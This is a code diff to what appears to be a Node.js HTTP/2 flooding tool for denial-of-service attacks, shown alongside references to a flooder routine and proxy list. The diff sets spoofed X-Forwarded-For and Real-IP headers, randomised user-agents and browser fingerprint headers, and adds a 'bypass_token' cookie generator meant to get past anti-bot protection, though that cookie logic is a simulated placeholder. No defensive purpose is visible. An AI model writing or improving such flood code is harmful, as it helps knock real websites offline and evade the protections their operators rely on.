@@ -175,32 +175,52 @@ const net = require("net");
  }
 
  const Socker = new NetSocket();
- headers[":method"] = "GET";
- headers[":authority"] = parsedTarget.host;
- //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
- headers[":scheme"] = "https";
- headers["x-forwarded-proto"] = "https";
- headers["accept-language"] = lang;
- headers["accept-encoding"] = encoding;
- headers["X-Forwarded-For"] = spoofed;
- headers["X-Forwarded-Host"] = spoofed;
- headers["Real-IP"] = spoofed;
- headers["cache-control"] = control;
- headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
- headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = "Windows";
- //headers["origin"] = "https://" + parsedTarget.host;
- //headers["referer"] = "https://" + parsedTarget.host;
- headers["upgrade-insecure-requests"] = "1";
- headers["accept"] = accept;
- headers["user-agent"] = randstr(15);
- headers["sec-fetch-dest"] = "document";
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-site"] = "none";
- headers["TE"] = "trailers";
- headers["Trailer"] = "Max-Forwards";
- headers["sec-fetch-user"] = "?1";
- headers["x-requested-with"] = "XMLHttpRequest";
+headers[":method"] = "GET";
+headers[":authority"] = parsedTarget.host;
+// headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
+headers[":scheme"] = "https";
+headers["x-forwarded-proto"] = "https";
+headers["accept-language"] = lang;
+headers["accept-encoding"] = encoding;
+headers["X-Forwarded-For"] = spoofed;
+headers["X-Forwarded-Host"] = spoofed;
+headers["Real-IP"] = spoofed;
+headers["cache-control"] = control;
+headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = "Windows";
+headers["origin"] = "https://" + parsedTarget.host;
+headers["referer"] = "https://" + parsedTarget.host;
+headers["upgrade-insecure-requests"] = "1";
+headers["accept"] = accept;
+headers["user-agent"] = randstr(15);
+headers["sec-fetch-dest"] = "document";
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-site"] = "none";
+headers["TE"] = "trailers";
+headers["Trailer"] = "Max-Forwards";
+headers["sec-fetch-user"] = "?1";
+headers["x-requested-with"] = "XMLHttpRequest";
+
+// Generate cookie for bypassing
+headers["cookie"] = generateCookie(parsedTarget.host);
+
+function generateCookie(host) {
+  // Simulate cookie generation logic
+  const cookieName = "bypass_token";
+  const cookieValue = randstr(20); // Random string for bypass
+  const expires = new Date(Date.now() + 3600 * 1000).toUTCString(); // 1 hour expiration
+  return `${cookieName}=${cookieValue}; Domain=${host}; Path=/; Expires=${expires}; Secure; HttpOnly`;
+}
+
+function randstr(length) {
+  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let result = "";
+  for (let i = 0; i < length; i++) {
+    result += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return result;
+}
  
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
